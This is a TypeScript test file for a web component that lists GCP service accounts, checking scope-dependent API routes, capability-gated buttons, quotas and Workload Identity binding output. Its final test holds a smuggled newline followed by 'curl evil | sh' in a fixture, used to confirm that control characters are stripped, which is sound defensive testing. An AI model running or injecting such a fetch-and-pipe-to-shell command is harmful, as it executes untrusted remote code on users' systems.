/**
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Tests for the scope-parameterised GCP service account list.
 *
 * The component used to be pinned to a project. Two classes of failure come
 * with un-pinning it, and each test below belongs to one of them:
 *
 *   ASKED THE WRONG SERVER QUESTION — the component renders fine and shows
 *   another scope's accounts, or none, with no error anywhere.
 *
 *   OFFERED AN ACTION THAT CANNOT WORK — the Hub gates each action on
 *   capabilities returned per-scope. Both BYO registration and minting are
 *   now available at hub scope (registration since P9, minting since Phase 2),
 *   gated on the `create` and `mint` capabilities respectively.
 *
 * ON ASSERTING ABSENCE: "no create button" passes just as well when the
 * component failed to render, when the selector is misspelled, and when the
 * feature was deleted. Every absence assertion here is paired with a positive
 * control in the same test — the same selector, finding the button, under the
 * one condition that should produce it.
 */

import { describe, it, expect, vi, beforeAll, afterEach } from 'vitest';
import { requestUrl } from '../../client/__fixtures__/request-url.js';
import { resetServerFlagStateForTests, setFeatureFlag } from '../../utils/feature-flags.js';
import type { ScionGCPServiceAccountList } from './gcp-service-account-list.js';

interface FetchCall {
  url: string;
  method: string;
}

/**
 * A fetch mock that records every request and answers list GETs from a fixture.
 * Anything it is not told about answers 200 {} — a test that depends on an
 * unstubbed response is a test whose subject is not what it says it is.
 */
function makeFetch(
  calls: FetchCall[],
  listBody: Record<string, unknown>
): (url: string | URL | Request, init?: RequestInit) => Promise<Response> {
  return (url, init) => {
    calls.push({ url: requestUrl(url), method: init?.method ?? 'GET' });
    return Promise.resolve(
      new Response(JSON.stringify(listBody), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      })
    );
  };
}

async function createComponent(
  attrs: Record<string, string>,
  fetchMock: (url: string | URL | Request, init?: RequestInit) => Promise<Response>
) {
  vi.stubGlobal('fetch', vi.fn(fetchMock));
  const el = document.createElement('scion-gcp-service-account-list') as InstanceType<
    typeof ScionGCPServiceAccountList
  >;
  for (const [k, v] of Object.entries(attrs)) {
    el.setAttribute(k, v);
  }
  document.body.appendChild(el);
  await settle(el);
  return el;
}

async function settle(el: { updateComplete: Promise<unknown> }): Promise<void> {
  await el.updateComplete;
  await new Promise((r) => setTimeout(r, 50));
  await el.updateComplete;
}

function account(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: 'sa-1',
    email: 'one@gcp-project-xyz.iam.gserviceaccount.com',
    projectId: 'gcp-project-xyz',
    scope: 'hub',
    scopeId: 'hub',
    displayName: 'One',
    verified: true,
    verificationStatus: 'verified',
    managed: false,
    ...overrides,
  };
}

/**
 * Text of every sl-button the user can actually reach, whitespace-collapsed.
 *
 * DIALOG BUTTONS ARE EXCLUDED, and this is not tidying. Both dialogs are in the
 * DOM at all times — `?open` is a property, not a conditional render — so their
 * footers contribute a "Register" and a "Mint" to every scope. Counting those
 * as affordances makes the absence assertions below unfailable, which is how
 * this helper was first written and how the mint test caught it.
 *
 * The closed dialogs are not themselves an affordance: openAddDialog and
 * openMintDialog are called from the header/empty-state buttons and nowhere
 * else, so with those suppressed there is no path that opens either one.
 */
function buttonLabels(el: HTMLElement): string[] {
  const root = (el as unknown as { shadowRoot: ShadowRoot }).shadowRoot;
  return Array.from(root.querySelectorAll('sl-button'))
    .filter((b) => !b.closest('sl-dialog'))
    .map((b) => (b.textContent ?? '').replace(/\s+/g, ' ').trim());
}

function iconButtons(el: HTMLElement, name: string): Element[] {
  const root = (el as unknown as { shadowRoot: ShadowRoot }).shadowRoot;
  return Array.from(root.querySelectorAll(`sl-icon-button[name="${name}"]`));
}

describe('scion-gcp-service-account-list', () => {
  beforeAll(async () => {
    await import('./gcp-service-account-list.js');
  });

  afterEach(() => {
    document.body.innerHTML = '';
    delete window.__SCION_FEATURES__;
    resetServerFlagStateForTests();
    vi.restoreAllMocks();
  });

  describe('which question it asks the server', () => {
    it('asks the flat route for the hub, and the nested route for a project', async () => {
      const hubCalls: FetchCall[] = [];
      await createComponent({ scope: 'hub' }, makeFetch(hubCalls, { items: [] }));

      const projectCalls: FetchCall[] = [];
      await createComponent(
        { scope: 'project', scopeId: 'proj-1' },
        makeFetch(projectCalls, { items: [] })
      );

      // The two scopes must not fetch the same URL. Asserting each literal
      // separately would still pass if a refactor collapsed both onto one
      // route that happens to match one of the fixtures.
      expect(hubCalls[0].url).not.toBe(projectCalls[0].url);
      expect(hubCalls[0].url).toBe('/api/v1/gcp-service-accounts?scope=hub');
      expect(projectCalls[0].url).toBe('/api/v1/projects/proj-1/gcp-service-accounts');
    });

    it('renders the accounts the hub route returned', async () => {
      const calls: FetchCall[] = [];
      const el = await createComponent(
        { scope: 'hub' },
        makeFetch(calls, {
          items: [
            account({ id: 'sa-1', email: 'one@p.iam.gserviceaccount.com' }),
            account({ id: 'sa-2', email: 'two@p.iam.gserviceaccount.com' }),
          ],
        })
      );

      const text = el.shadowRoot!.textContent ?? '';
      expect(text).toContain('one@p.iam.gserviceaccount.com');
      expect(text).toContain('two@p.iam.gserviceaccount.com');
      // Not the empty state, which is the other thing a hub-scoped list could
      // plausibly show and which would make the assertions above vacuous if
      // the emails leaked in from somewhere else.
      expect(text).not.toContain('No GCP Service Accounts');
    });

    it('fetches once on mount, and again only when re-pointed', async () => {
      // Lit reports every initially-set property as changed on the first
      // update, so the naive `changed.has('scope')` form double-fetches here.
      const calls: FetchCall[] = [];
      const el = await createComponent(
        { scope: 'project', scopeId: 'proj-1' },
        makeFetch(calls, { items: [] })
      );
      expect(calls.length).toBe(1);

      // An unrelated property change must not re-fetch...
      el.compact = true;
      await settle(el);
      expect(calls.length).toBe(1);

      // ...but re-pointing at another scope must, or the previous scope's rows
      // stay on screen looking like this scope's answer.
      el.scopeId = 'proj-2';
      await settle(el);
      expect(calls.length).toBe(2);
      expect(calls[1].url).toBe('/api/v1/projects/proj-2/gcp-service-accounts');
    });
  });

  describe('hub-scope affordances: Register and Mint are both offered', () => {
    /**
     * Hub-scope BYO registration was enabled on the backend in P9. The
     * capability is the sole gate — a hub admin with `create` now sees the
     * Register Existing button at hub scope, just as at project scope.
     */
    it('shows Register Existing at hub scope when caller has create capability', async () => {
      const caps = { actions: ['create', 'list', 'mint'] };

      const hubEl = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: caps })
      );
      const projectEl = await createComponent(
        { scope: 'project', scopeId: 'proj-1' },
        makeFetch([], { items: [], _capabilities: caps })
      );

      const hubLabels = buttonLabels(hubEl).join('|');
      const projectLabels = buttonLabels(projectEl).join('|');

      expect(hubLabels).toContain('Register Existing');
      // POSITIVE CONTROL: both scopes show the button when the capability is present.
      expect(projectLabels).toContain('Register Existing');
    });

    it('hides Register Existing at hub scope when caller lacks create capability', async () => {
      const caps = { actions: ['list'] }; // no 'create'

      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: caps })
      );

      expect(buttonLabels(el).join('|')).not.toContain('Register Existing');
    });

    it('shows Mint at hub scope when caller has mint capability', async () => {
      const caps = { actions: ['create', 'mint'] };

      const hubEl = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: caps })
      );
      const projectEl = await createComponent(
        { scope: 'project', scopeId: 'proj-1' },
        makeFetch([], { items: [], _capabilities: caps })
      );

      // Both scopes show Mint when the capability is present.
      expect(buttonLabels(hubEl).join('|')).toContain('Mint');
      expect(buttonLabels(projectEl).join('|')).toContain('Mint');
    });

    it('hides Mint at hub scope when caller lacks mint capability', async () => {
      const caps = { actions: ['create', 'list'] }; // no 'mint'

      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: caps })
      );

      expect(buttonLabels(el).join('|')).not.toContain('Mint');
    });

    it('shows Register and Mint in the empty state', async () => {
      // The empty state carries its own copy of both affordances. A new hub
      // with no accounts is where "Register" and "Mint" are most useful.
      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: { actions: ['create', 'mint'] } })
      );

      expect(el.shadowRoot!.textContent).toContain('No GCP Service Accounts');
      expect(buttonLabels(el).join('|')).toContain('Register Existing');
      expect(buttonLabels(el).join('|')).toContain('Mint');
    });

    it('shows Register and Mint in compact mode', async () => {
      const caps = { actions: ['create', 'mint'] };

      const hubEl = await createComponent(
        { scope: 'hub', compact: '' },
        makeFetch([], { items: [account()], _capabilities: caps })
      );
      const projectEl = await createComponent(
        { scope: 'project', scopeId: 'proj-1', compact: '' },
        makeFetch([], {
          items: [account({ scope: 'project', scopeId: 'proj-1' })],
          _capabilities: caps,
        })
      );

      expect(buttonLabels(hubEl).join('|')).toContain('Register Existing');
      expect(buttonLabels(hubEl).join('|')).toContain('Mint');
      expect(buttonLabels(projectEl).join('|')).toContain('Register Existing');
      expect(buttonLabels(projectEl).join('|')).toContain('Mint');
    });
  });

  describe('row actions come from the row, not from the row being visible', () => {
    it('renders Delete for exactly the accounts whose capabilities allow it', async () => {
      // Both rows are visible to this caller — that is the normal case for
      // hub-scoped accounts, which hub-member-read-all exposes to everyone.
      // Only one is deletable.
      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], {
          items: [
            account({
              id: 'sa-yes',
              email: 'yes@p.iam.gserviceaccount.com',
              _capabilities: { actions: ['delete', 'verify'] },
            }),
            account({
              id: 'sa-no',
              email: 'no@p.iam.gserviceaccount.com',
              _capabilities: { actions: [] },
            }),
          ],
        })
      );

      // Both rows rendered (otherwise "one trash button" is satisfied by the
      // second row simply being missing).
      expect(el.shadowRoot!.textContent).toContain('yes@p.iam.gserviceaccount.com');
      expect(el.shadowRoot!.textContent).toContain('no@p.iam.gserviceaccount.com');
      expect(iconButtons(el, 'trash').length).toBe(1);
    });

    it('renders no Delete when the Hub sends no capabilities at all', async () => {
      // Fail closed: absent capabilities are not permission, and this is the
      // shape a list route that has not been taught to compute them returns.
      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [account({ _capabilities: undefined })] })
      );

      expect(el.shadowRoot!.textContent).toContain('one@gcp-project-xyz');
      expect(iconButtons(el, 'trash').length).toBe(0);
    });

    it('deletes a hub-scoped account at its flat address', async () => {
      const calls: FetchCall[] = [];
      const el = await createComponent(
        { scope: 'hub' },
        makeFetch(calls, {
          items: [account({ id: 'sa-1', _capabilities: { actions: ['delete'] } })],
        })
      );

      // altKey skips the confirm(), which happy-dom does not implement.
      await (
        el as unknown as {
          handleDelete: (a: unknown, e: MouseEvent) => Promise<void>;
        }
      ).handleDelete(account({ id: 'sa-1' }), new MouseEvent('click', { altKey: true }));

      const del = calls.find((c) => c.method === 'DELETE');
      expect(del).toBeDefined();
      expect(del!.url).toBe('/api/v1/gcp-service-accounts/sa-1');
      // A hub-scoped account has no owning project, so any /projects/ address
      // for it is borrowed from something else on screen.
      expect(del!.url).not.toContain('/projects/');
    });

    it('re-verifies a hub-scoped account at its flat address', async () => {
      const calls: FetchCall[] = [];
      const el = await createComponent(
        { scope: 'hub' },
        makeFetch(calls, {
          items: [account({ id: 'sa-1', _capabilities: { actions: ['verify'] } })],
        })
      );

      const verifyButtons = iconButtons(el, 'arrow-clockwise');
      expect(verifyButtons.length).toBe(1);

      await (el as unknown as { handleVerify: (a: unknown) => Promise<void> }).handleVerify(
        account({ id: 'sa-1' })
      );

      const post = calls.find((c) => c.method === 'POST');
      expect(post).toBeDefined();
      expect(post!.url).toBe('/api/v1/gcp-service-accounts/sa-1/verify');
    });

    it('re-verifies a project-scoped account at its nested address', async () => {
      // Same button, different address, decided by the ACCOUNT's scope rather
      // than by the list's — which is what lets a project list show hub-scoped
      // rows (includeHubScoped) without mis-addressing them.
      const calls: FetchCall[] = [];
      const el = await createComponent(
        { scope: 'project', scopeId: 'proj-1' },
        makeFetch(calls, {
          items: [
            account({
              id: 'sa-p',
              scope: 'project',
              scopeId: 'proj-1',
              _capabilities: { actions: ['verify'] },
            }),
          ],
        })
      );

      await (el as unknown as { handleVerify: (a: unknown) => Promise<void> }).handleVerify(
        account({ id: 'sa-p', scope: 'project', scopeId: 'proj-1' })
      );

      const post = calls.find((c) => c.method === 'POST');
      expect(post!.url).toBe('/api/v1/projects/proj-1/gcp-service-accounts/sa-p/verify');
    });
  });

  describe('hub-scope quota logic', () => {
    it('isMintDisabled returns true when hub_cap is reached', async () => {
      const caps = { actions: ['create', 'mint'] };
      const mintQuota = {
        project_minted: 0,
        project_cap: 0,
        hub_minted: 2,
        hub_cap: 2,
        global_minted: 2,
        global_cap: 10,
      };

      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: caps, mint_quota: mintQuota })
      );

      // The component exposes isMintDisabled as a private method — call it
      // through the element to exercise scope-aware branching.
      const disabled = (el as unknown as { isMintDisabled: () => boolean }).isMintDisabled();
      expect(disabled).toBe(true);
    });

    it('renderQuotaInfo shows "Hub: X/Y" at hub scope', async () => {
      const caps = { actions: ['create', 'mint'] };
      const mintQuota = {
        project_minted: 0,
        project_cap: 0,
        hub_minted: 1,
        hub_cap: 5,
        global_minted: 3,
        global_cap: 10,
      };

      const el = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [], _capabilities: caps, mint_quota: mintQuota })
      );

      const text = el.shadowRoot!.textContent ?? '';
      expect(text).toContain('Hub: 1/5');
      // Should not show "Project:" at hub scope.
      expect(text).not.toContain('Project:');
    });
  });

  describe('links out', () => {
    it('links parentless accounts to the detail page and project ones with their project', async () => {
      const hubEl = await createComponent(
        { scope: 'hub' },
        makeFetch([], { items: [account({ id: 'sa-1' })] })
      );
      const projectEl = await createComponent(
        { scope: 'project', scopeId: 'proj-1' },
        makeFetch([], { items: [account({ id: 'sa-p', scope: 'project', scopeId: 'proj-1' })] })
      );

      const hubLink = hubEl.shadowRoot!.querySelector('a[href^="/settings/service-accounts/"]');
      expect(hubLink).not.toBeNull();
      expect(hubLink!.getAttribute('href')).toBe('/settings/service-accounts/sa-1');

      // A project row links to the project-relative status view (no actions
      // there; verify and delete stay in this list).
      const projectLink = projectEl.shadowRoot!.querySelector(
        'a[href^="/settings/service-accounts/"]'
      );
      expect(projectLink).not.toBeNull();
      expect(projectLink!.getAttribute('href')).toBe(
        '/settings/service-accounts/sa-p?project=proj-1'
      );
      expect(projectLink!.textContent).toContain('one@gcp-project-xyz');
    });
  });

  describe('mint dialog Workload Identity binding lines (hub.k8s_workload_identity_setup)', () => {
    const sampleBindings = [
      {
        pool: 'cluster-p.svc.id.goog',
        namespace: 'agents',
        ksa: 'scion-wi',
        member: 'serviceAccount:cluster-p.svc.id.goog[agents/scion-wi]',
        profiles: ['broker-a/gke-prod'],
        state: 'bound',
      },
      {
        profiles: ['broker-b/gke-dev'],
        state: 'skipped',
        reason: 'no_workload_identity_pool',
        detail:
          'no workload_identity_pool is configured for these Kubernetes runtime targets on the Runtime Broker',
        manualStep:
          "gcloud iam service-accounts add-iam-policy-binding 'scion-wi@hub.iam.gserviceaccount.com' --role roles/iam.workloadIdentityUser --member 'serviceAccount:<CLUSTER_PROJECT>.svc.id.goog[<NAMESPACE>/scion-wi]'",
      },
      {
        pool: 'bad-p.svc.id.goog',
        namespace: 'agents',
        ksa: 'scion-wi',
        member: 'serviceAccount:bad-p.svc.id.goog[agents/scion-wi]',
        profiles: ['broker-c/gke'],
        state: 'failed',
        reason: 'iam_error',
        detail: 'the IAM policy update failed: backend error',
        manualStep:
          "gcloud iam service-accounts add-iam-policy-binding 'scion-wi@hub.iam.gserviceaccount.com' --role roles/iam.workloadIdentityUser --member 'serviceAccount:bad-p.svc.id.goog[agents/scion-wi]'",
      },
    ];

    function makeMintFetch(calls: FetchCall[], mintResponse: Record<string, unknown>) {
      return (url: string | URL | Request, init?: RequestInit): Promise<Response> => {
        const u = requestUrl(url);
        const method = init?.method ?? 'GET';
        calls.push({ url: u, method });
        if (method === 'POST' && u.includes('/mint')) {
          return Promise.resolve(
            new Response(JSON.stringify(mintResponse), {
              status: 201,
              headers: { 'Content-Type': 'application/json' },
            })
          );
        }
        return Promise.resolve(
          new Response(
            JSON.stringify({ items: [], _capabilities: { actions: ['create', 'mint'] } }),
            { status: 200, headers: { 'Content-Type': 'application/json' } }
          )
        );
      };
    }

    function mintDialog(el: HTMLElement): Element {
      const dialog = el.shadowRoot!.querySelector('sl-dialog[label="Mint GCP Service Account"]');
      expect(dialog).not.toBeNull();
      return dialog!;
    }

    it.each([
      {
        scope: 'project',
        scopeId: 'proj-1',
        expectedMintUrl: '/api/v1/projects/proj-1/gcp-service-accounts/mint',
      },
      { scope: 'hub', scopeId: '', expectedMintUrl: '/api/v1/gcp-service-accounts/mint?scope=hub' },
    ])(
      'shows one line per binding entry when the experiment is on ($scope scope) and hides them when off',
      async ({ scope, scopeId, expectedMintUrl }) => {
        const minted = account({
          id: 'sa-minted',
          email: 'scion-wi@hub.iam.gserviceaccount.com',
          scope,
          scopeId: scopeId || 'hub',
          managed: true,
          workloadIdentityBindings: sampleBindings,
        });

        // Positive control: experiment ON -> dialog stays open with binding lines.
        setFeatureFlag('hub.k8s_workload_identity_setup', true);
        const onCalls: FetchCall[] = [];
        const attrs: Record<string, string> = { scope };
        if (scopeId) attrs.scopeId = scopeId;
        const onEl = await createComponent(attrs, makeMintFetch(onCalls, minted));

        const events: unknown[] = [];
        onEl.addEventListener('sa-list-changed', (e) => events.push((e as CustomEvent).detail));

        (onEl as unknown as { openMintDialog: () => void }).openMintDialog();
        await settle(onEl);
        expect(mintDialog(onEl).hasAttribute('open')).toBe(true);

        await (onEl as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
          new Event('submit')
        );
        await settle(onEl);

        const post = onCalls.find((c) => c.method === 'POST');
        expect(post?.url).toBe(expectedMintUrl);
        expect(events).toHaveLength(1);

        const openAfterMint = mintDialog(onEl);
        expect(openAfterMint.hasAttribute('open')).toBe(true);
        expect(openAfterMint.querySelectorAll('.wi-binding-item').length).toBe(3);

        const dialogText = openAfterMint.textContent ?? '';
        expect(dialogText).toContain('Workload Identity bindings');
        expect(dialogText).toContain('serviceAccount:cluster-p.svc.id.goog[agents/scion-wi]');
        expect(dialogText).toContain('broker-a/gke-prod');
        expect(dialogText).toContain('no_workload_identity_pool');
        expect(dialogText).toContain('broker-b/gke-dev');
        expect(dialogText).toContain('iam_error');
        expect(dialogText).toContain(
          "gcloud iam service-accounts add-iam-policy-binding 'scion-wi@hub.iam.gserviceaccount.com'"
        );
        expect(dialogText).toContain('take a few minutes to take effect');

        // Closing via Done and re-opening resets back to the mint form.
        (onEl as unknown as { closeMintDialog: () => void }).closeMintDialog();
        await settle(onEl);
        expect(mintDialog(onEl).hasAttribute('open')).toBe(false);

        (onEl as unknown as { openMintDialog: () => void }).openMintDialog();
        await settle(onEl);
        expect(mintDialog(onEl).querySelectorAll('.wi-binding-item').length).toBe(0);

        // Negative control: experiment OFF -> dialog closes immediately and renders no binding lines.
        setFeatureFlag('hub.k8s_workload_identity_setup', false);
        const offEl = await createComponent(attrs, makeMintFetch([], minted));
        (offEl as unknown as { openMintDialog: () => void }).openMintDialog();
        await settle(offEl);
        await (offEl as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
          new Event('submit')
        );
        await settle(offEl);

        expect(mintDialog(offEl).hasAttribute('open')).toBe(false);
        expect(mintDialog(offEl).querySelectorAll('.wi-binding-item').length).toBe(0);
      }
    );

    it('closes the mint dialog immediately when the experiment is on but no Kubernetes targets were reported', async () => {
      setFeatureFlag('hub.k8s_workload_identity_setup', true);
      const minted = account({
        id: 'sa-minted',
        email: 'scion-docker@hub.iam.gserviceaccount.com',
        managed: true,
      });
      const el = await createComponent({ scope: 'hub' }, makeMintFetch([], minted));

      (el as unknown as { openMintDialog: () => void }).openMintDialog();
      await settle(el);
      await (el as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
        new Event('submit')
      );
      await settle(el);

      expect(mintDialog(el).hasAttribute('open')).toBe(false);
    });

    it('replaces control characters in binding details and manual steps with spaces', async () => {
      setFeatureFlag('hub.k8s_workload_identity_setup', true);
      const minted = account({
        id: 'sa-minted',
        email: 'scion-wi@hub.iam.gserviceaccount.com',
        managed: true,
        workloadIdentityBindings: [
          {
            profiles: ['broker-b/gke'],
            state: 'failed',
            reason: 'iam_error',
            detail: 'bad\nsecond-line',
            manualStep: 'gcloud iam ...\ncurl evil | sh',
          },
        ],
      });
      const el = await createComponent({ scope: 'hub' }, makeMintFetch([], minted));

      (el as unknown as { openMintDialog: () => void }).openMintDialog();
      await settle(el);
      await (el as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
        new Event('submit')
      );
      await settle(el);

      const cmdEl = mintDialog(el).querySelector('.gcloud-command');
      expect(cmdEl).not.toBeNull();
      expect(cmdEl!.textContent).not.toContain('\n');
      expect(cmdEl!.textContent).toContain('gcloud iam ... curl evil | sh');
      expect(mintDialog(el).textContent).not.toContain('take a few minutes to take effect');
    });
  });
});
